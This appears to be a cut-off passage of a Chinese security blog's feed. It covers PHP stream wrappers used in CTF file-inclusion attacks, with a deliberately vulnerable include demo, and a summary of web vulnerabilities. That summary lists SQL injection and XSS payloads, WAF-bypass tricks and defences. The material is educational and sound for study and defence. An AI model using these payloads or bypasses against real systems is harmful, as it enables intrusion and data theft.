class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后弹出计算器，即利用了反射机制实现系统命令执行：</p><p><img src="/2019/02/01/Java反射机制/8.png" alt="示例5"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/whgk/p/6122036.html" target="_blank" rel="noopener">Java中反射机制详解</a></p><p><a href="https://www.cnblogs.com/AaronCui/p/4911123.html" target="_blank" rel="noopener">Java反射机制Reflection</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;反射机制定义：&lt;/strong&gt;Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="https://Mi1k7ea.github.com/2019/01/31/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://Mi1k7ea.github.com/2019/01/31/PHP伪协议/</id>
    <published>2019-01-31T13:24:25.000Z</published>
    <updated>2019-02-08T14:28:36.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>PHP伪协议在CTF中经常使用到，这里写个简单的Demo小结一下，主要对file://、php://filter、php://input、data://、zip://、compress.bzip2://、compress.zlib://、phar://等协议进行简单的Demo介绍分析。</p><p>简单说一下，file://用于访问本地文件系统读取本地文件；php://访问各个输入/输出流（I/O streams），其中php://filter用于读取文件内容，php://input可以访问请求的原始数据的只读流、同时可将post请求中的数据作为PHP代码执行；zip://，bzip2://，zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名；data://即写入数据；phar://即PHP归档。</p><h2 id="简单文件包含Demo代码"><a href="#简单文件包含Demo代码" class="headerlink" title="简单文件包含Demo代码"></a>简单文件包含Demo代码</h2><p>demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Hi, just a test for php pseudo protocol. :)&lt;/h3&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;u can input a param called "file" by GET method.&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"file"</span>]))&#123;</span><br><span class="line">@<span class="keyword">include</span>($_GET[<span class="string">"file"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常访问，提示可以通过GET传入一个file参数包含文件：</p><p><img src="/2019/01/31/PHP伪协议/1.png" alt="文件包含Demo"></p><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><p>file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件且不受allow_url_fopen与allow_url_include的影响。</p><p>注意：该协议的路径只能输入绝对路径，输入相对路径是不生效的。</p><p>先输入一个文本文件，可以读到该文件内容，比如CTF经常遇到的flag：</p><p><img src="/2019/01/31/PHP伪协议/2.png" alt="file://读取txt文件"></p><p>输入php或JS文件，file://协议会执行该PHP文件里的代码而不是显示该内容，因而该协议不适用于获取文件内容源代码（而常用php://filter伪协议）：</p><p><img src="/2019/01/31/PHP伪协议/3.png" alt="file://读取php文件"></p><p><img src="/2019/01/31/PHP伪协议/4.png" alt="file://读取js文件"></p><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h2><p>php://访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><p>不需要开启allow_url_fopen，仅php://input、php://stdin、 php://memory和php://temp需要开启allow_url_include。</p><h3 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h3><p>php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。在CTF中主要用于读取文件内容。不需要开启allow_url_fopen和allow_url_include。</p><p>查看之前的test.js文件与PHP文件：</p><p><img src="/2019/01/31/PHP伪协议/5.png" alt="php://filter读取js文件"></p><p><img src="/2019/01/31/PHP伪协议/6.png" alt="php://filter读取php文件"></p><h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议"></a>php://input协议</h3><p>php://input可以访问请求的原始数据的只读流，在CTF中多用于执行php代码。</p><p>不需要开启allow_url_fopen和allow_url_include。</p><p><img src="/2019/01/31/PHP伪协议/7.png" alt="php://input写入phpinfo"></p><p><img src="/2019/01/31/PHP伪协议/8.png" alt="php://input写入system"></p><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://即数据，在CTF中主要用于写入代码并包含该代码到当前页面中。</p><p>必须同时开启allow_url_fopen和allow_url_include。</p><p>使用形式如下：</p><p>data:text/plain;base64, \<script>alert(‘xss’)\</script></p><p>data://text/plain;base64, \<script>alert(‘xss’)\</script></p><p>data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</p><p>data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</p><p><img src="/2019/01/31/PHP伪协议/9.png" alt="data://协议写入phpinfo"></p><p><img src="/2019/01/31/PHP伪协议/10.png" alt="data://协议写入js代码"></p><h2 id="zip-、bzip2-、zlib-协议"><a href="#zip-、bzip2-、zlib-协议" class="headerlink" title="zip://、bzip2://、zlib://协议"></a>zip://、bzip2://、zlib://协议</h2><p>zip://、bzip2://、zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p><p>不需要开启allow_url_fopen和allow_url_include。</p><h3 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h3><p>zip://压缩流，不需要开启allow_url_fopen和allow_url_include。</p><p>使用方法：</p><p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p><p>文件路径必须为绝对路径。</p><p>上传一个包含PHP代码文件的zip包，只要zip://访问该协议即触发文件包含漏洞、将任意文本文件中的内容当作PHP代码执行：</p><p><img src="/2019/01/31/PHP伪协议/11.png" alt="demo"></p><p>当然可以修改上传的zip文件后缀名为其他如图片后缀，根据特定情况可绕过一些上传文件类型的限制：</p><p><img src="/2019/01/31/PHP伪协议/12.png" alt="demo"></p><h3 id="zlib-协议"><a href="#zlib-协议" class="headerlink" title="zlib://协议"></a>zlib://协议</h3><p>zlib://压缩流，不需要开启allow_url_fopen和allow_url_include。</p><p>使用方法：</p><p>compress.zlib://file</p><p>文件无绝对路径限制。</p><p><img src="/2019/01/31/PHP伪协议/13.png" alt="demo"></p><p><img src="/2019/01/31/PHP伪协议/14.png" alt="demo"></p><h3 id="bzip2-协议"><a href="#bzip2-协议" class="headerlink" title="bzip2://协议"></a>bzip2://协议</h3><p>bzip2://压缩流，不需要开启allow_url_fopen和allow_url_include。</p><p>使用方法：</p><p>compress.bzip2://file</p><p>文件无绝对路径限制。</p><p>可是这里怎么测试都不成功，通过phpinfo查看bzip2://是enable且文件类型和文件路径都进行尝试，PHP版本也换了几个，还是无法显示phpinfo信息，哪位知道原因的大佬请指点一下 : )</p><h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h2><p>phar://即PHP归档，常用于解析phar文件内容，最近的CTF中多用于phar反序列化漏洞利用。反序列化漏洞具体的利用可参考<a href="https://blog.csdn.net/SKI_12/article/details/85551194" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/85551194</a></p><p><img src="/2019/01/31/PHP伪协议/15.png" alt="demo"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;PHP伪协议在CTF中经常使用到，这里写个简单的Demo小结一下，主要对file://、php://filter、php:/
      
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>常见Web漏洞类型总结</title>
    <link href="https://Mi1k7ea.github.com/2019/01/30/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/"/>
    <id>https://Mi1k7ea.github.com/2019/01/30/常见Web漏洞类型/</id>
    <published>2019-01-30T14:47:15.000Z</published>
    <updated>2019-02-08T14:36:33.701Z</updated>
    
    <content type="html"><![CDATA[<p>这里小结一下常见的Web漏洞类型，待完善。</p><h2 id="SQL注入与SQL盲注"><a href="#SQL注入与SQL盲注" class="headerlink" title="SQL注入与SQL盲注"></a>SQL注入与SQL盲注</h2><h3 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>　　SQL注入漏洞作为OWASP TOP10中重要的一部分，可见其安全性的危害有多大。简单地说，SQL注入就是通过构建特殊的具有SQL语法的语句，绕到数据库中进而执行相应的操作的漏洞。攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p><p><strong>成因</strong></p><p>　　针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：</p><ol><li>程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li><li>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</li></ol><p><strong>攻击方式</strong></p><p>　　SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为基于报错的注入、基于布尔的注入和盲注。</p><p>​    基于报错的注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，如注入各种符号以及组合： ‘  “  (  %</p><p>​    基于布尔的注入：攻击者可以直接在当前界面内容中获取想要获得的内容，如注入：1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0，当返回的结果不同时即有漏洞</p><p>　　盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容</p><p>​    判断盲注的常见用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1’ and 1=1 <span class="comment">#</span></span><br><span class="line">1’ and 1=2 <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>​    判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。</p><p>​    基于布尔的注入代码示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>​    基于报错的注入代码示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> email_id <span class="keyword">from</span> emails <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">5</span>),<span class="number">0x2a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> x<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>​    盲注代码示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (<span class="keyword">select</span> <span class="keyword">substr</span>(email_id,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> emails <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">3</span>) &gt; <span class="string">'a'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>几个常用的函数</strong></p><p>​    user()返回当前数据库连接使用的用户；</p><p>​    database()返回当前数据库连接使用的数据库；</p><p>​    version()返回当前数据库的版本；</p><p>​    concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(char(32,58,32),user(),database(),version())</span><br></pre></td></tr></table></figure><p>​    其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。</p><p><strong>几个常用的全局函数</strong></p><p>​    @@datadir  @@hostname  @@VERSION  @@version_compile_os</p><p><strong>危害</strong></p><p>　　攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。</p><h3 id="二、绕过WAF的方法"><a href="#二、绕过WAF的方法" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h3><p><strong>1、大小写绕过</strong></p><p>​    如：?id=1’ uNiOn SElecT * FrOm users #</p><p><strong>2、简单编码绕过</strong></p><p>​    如URL编码、双重URL编码、Hex编码、Unicode编码等。</p><p>​    ?id=1%252f%252a*/UNION%252f%252a /SELECT</p><p>​    id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4…</p><p>​    ?id=10%D6‘%20AND%201=2%23</p><p>​    SELECT ‘Ä’=’A’; #1    </p><p><strong>3、注释绕过</strong></p><p>​    如?id=1 uni/<strong>/on sele/</strong>/ct 1,2,3 # </p><p><strong>4、分隔重写绕过</strong></p><p>​    适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。</p><p><strong>5、HTTP参数污染(HPP)：</strong></p><p>​    如?id=1 union select 1,2,3 from users where id=1 # </p><p>​    这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 # </p><p>​    次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ；</p><p>​    这个例子也同理：?id=1/<em>/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=</em>/users # </p><p>​    如果服务器代码为： select <em> from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit </em>/from users # 可以看到，这种方式比较适合白盒测试。</p><p><strong>6、使用逻辑运算符 or /and 绕过</strong></p><p>​    如?id=1 or 0x50=0x50 </p><p>​    ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写，  ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。</p><p><strong>7、比较操作符替换</strong></p><p>​    比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。</p><p><strong>8、同功能函数替换</strong></p><p>​    substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的；</p><p>​    ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换；</p><p>​    在使用在基于延时的盲注中benchmark()和sleep()可以相互替换；</p><p>​    group_concat 、 concat 、concat_ws 三者可以互相替换；</p><p>​    还有一种新的方法 ，3条语句分别如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substring((<span class="keyword">select</span> ‘<span class="keyword">password</span>’),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="keyword">substr</span>((<span class="keyword">select</span> ‘<span class="keyword">password</span>’),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="keyword">mid</span>((<span class="keyword">select</span> ‘<span class="keyword">password</span>’),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br></pre></td></tr></table></figure><p>​    都是从 password 里判断第一个字符的值，可以用 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strcmp(left(‘password’,1), 0x69) = 1</span><br><span class="line">strcmp(left(‘password’,1), 0x70) = 0</span><br><span class="line">strcmp(left(‘password’,1), 0x71) = -1</span><br></pre></td></tr></table></figure><p>​    替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。</p><p><strong>9、盲注无需or和and</strong></p><p>​    例句：index.php?id=1</p><p>​    当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。</p><p><strong>10、加括号</strong></p><p>​    如?id=(1)union(select(1),mid(hash,1,32)from(users))   </p><p>​    ?id=(1)union(((((((select(1),hex(hash)from(users))))))))</p><p>​    ?id=(1)or(0x50=0x50)</p><p><strong>11、缓冲区溢出绕过</strong></p><p>​    如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #</p><p>​    其中 A 越多越好，一般要求 1000 个以上。</p><h3 id="三、检测方法"><a href="#三、检测方法" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p><strong>1、基于报错的检测方法</strong></p><p>使用各种符号以及组合： ‘  “  (  %</p><p>如直接在URL后添加单引号看是否报错index.php?id=1’</p><p><strong>2、基于布尔的检测</strong></p><p>最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0</p><p>当返回的结果不同时即有漏洞</p><p><strong>3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a</strong></p><p>添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞；</p><p>添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞；</p><p>添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。</p><p><strong>4、判断盲注的常用方法</strong></p><p>1’ and 1=1 #  </p><p>1’ and 1=2 #  </p><p>判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。</p><h3 id="四、防御方法"><a href="#四、防御方法" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p>关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。</p><p><strong>常用的修复方案</strong></p><p>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。</p><p>（2）过滤危险的 SQL 语句关键字。</p><p>（3）确认每种数据的类型。</p><p>（4）数据长度应该严格规定。</p><p>（5）网站每个数据层的编码统一。</p><p>（6）严格限制网站用户的数据库的操作权限。</p><p>（7）避免网站显示 SQL 错误信息。</p><p>（8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。</p><p>（9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。</p><p>其实最有效的防御手段是下面两种：</p><p><strong>1、预编译</strong></p><p>原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。</p><p>其过程如下:</p><p>（1）定义预编译的sql语句，其中待填入的参数用?占位。</p><p>（2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。</p><p>（3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。</p><p>（4）执行预处理对象。</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql=&quot;select id,no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">prestmt.setInt(1,id);</span><br><span class="line">prestmt.executeQuery();</span><br></pre></td></tr></table></figure><p><strong>2、变量绑定</strong></p><p>是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多，后面再补充。</p><h2 id="XSS（跨站脚本）"><a href="#XSS（跨站脚本）" class="headerlink" title="XSS（跨站脚本）"></a>XSS（跨站脚本）</h2><h3 id="一、基本概念-1"><a href="#一、基本概念-1" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>　　跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p><p>​    XSS，全称cross-site scripting，是用于攻击Web客户端而不是服务器端，其最大的特点是能把恶意的JS或HTML代码注入到用户浏览的网页上。而XSS漏洞的存在，主要是由于Web应用程序对用户的输入没有进行严格的过滤所导致的，当攻击者把恶意代码注入到网页时，用户只要访问该网页就会执行其中的恶意代码。</p><p><strong>成因</strong></p><p>　　造成XSS漏洞的原因就是，攻击者的输入没有经过严格的控制，最终显示给来访的用户，攻击者通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java,VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、个人网页内容、会话和cookie等各种内容。</p><p><strong>类型</strong></p><p>主要分为以下前3种。</p><p>​    反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。</p><p>​    存储型（持久型）：攻击者将恶意代码注入到Web服务器中并保存起来，只要客户端访问了相应的页面就会受到攻击。</p><p>​    DOM型：利用浏览器的DOM特性，不是向浏览器发请求而是直接通过在本地执行从而修改或窃取本地的信息。</p><p>​    Flash型：利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。<br>​    mXSS型：又被叫做突变XSS，主要被用于绕过XSS过滤。用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得一串看似没有任何危害的HTML代码，最终将进入某个DOM节点的innerHTML中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。</p><p><strong>使用场景</strong></p><p>​    直接嵌入html script标签中</p><p>​    元素标签事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(‘xss’)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    图片标签 img</p><p>​    框架标签 iframe</p><p>​    DOM对象</p><p><strong>利用方式</strong></p><p>​    窃取用户cookie来非法登录访问目标站点；</p><p>　　XSS与CSRF漏洞结合利用，使受害者在不知不觉中用用户的账号进行转账等敏感危险操作；</p><p>​    XSS蠕虫；</p><p>​    执行恶意JS代码实现键盘记录；</p><p>​    内嵌恶意HTML代码到页面中；</p><p>​    页面恶意重定向；</p><p>​    利用XSS进行DDOS，参考：SOHU视频XSS漏洞导致其用户成为DDOS肉鸡。</p><h3 id="二、绕过WAF的方法-1"><a href="#二、绕过WAF的方法-1" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h3><p><strong>利用&lt;&gt;标记注入HTML或JS</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(‘xss’)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用HTML标签属性值执行XSS</strong><br>    很多的HTML标记中的属性都支持javascript:[code]伪协议的形式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">”javascript:alert(</span>'<span class="attr">xss</span>');”&gt;</span></span><br></pre></td></tr></table></figure><p><strong>空格回车TAB</strong><br>    空白不会影响JS语句的在正常执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">”javas</span><span class="attr">cript:alert</span>('<span class="attr">xss</span>')” <span class="attr">width</span>=<span class="string">100</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对标签属性值进行转码</strong><br>    HTML属性值本身是支持ASCII码形式的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">”javascript:alert(</span>'<span class="attr">xss</span>')” <span class="attr">width</span>=<span class="string">100</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    其中t的ASCII码值为116，用“&amp;#116”来表示，而冒号:的ASCII值为58。</p><p>​    另外，Tab符的ASCII码为&amp;#9、换行符的为&amp;#10、回车符的为&amp;#13可以被插入到代码的任何地方中去。</p><p>​    还可以将&amp;#01、&amp;#02等字符插入到JavaScript的头部中。</p><p><strong>产生自己的事件</strong></p><p>​    事件是用户或浏览器自身执行的某个动作，如Click等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://10.10.10.137/alan.jpg</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>​    onerror是img标签的一个事件，只要页面发生错误就会激活相应的事件。</p><p>​    除此之外还有各种事件，如：onResume、onfinish、onstop、onReverse等等。</p><p><strong>利用CSS跨站剖析</strong></p><p>​    CSS是XSS的另一个载体，代码通常是嵌入到style标签/属性中的。</p><p>​    缺点是个浏览器之间不能通用。</p><p><strong>扰乱过滤规则</strong></p><p><strong>转换大小写，顺序可以随意</strong></p><p><strong>双引号与单引号互换</strong></p><p><strong>不使用引号</strong></p><p><strong>注释符号</strong></p><p><strong>内嵌</strong></p><p><strong>字符编码</strong><br>    可以对代码进行十进制编码（&amp;#），可以在每个十进制字符后面加上分号；，也可以采用&amp;#0、&amp;#00；等的形式。</p><p>​    JS中的eval()函数，用于计算字符串并执行其中的JS代码。可以使用\连接十六进制字符串形式的脚本让eval()函数来执行，如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(“\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29”);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    也可以让其执行十进制形式的脚本，但需要和String.fromCharCode()函数一起使用、实现将字符转为ASCII值，如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    在利用CSS中，可以对style中的属性进行十六进制的编码来绕过。</p><p><strong>Shellcode的调用</strong></p><p>​    简单地说，Shellcode是指对一个漏洞进行利用的代码。</p><p><strong>动态调用远程JS</strong><br>    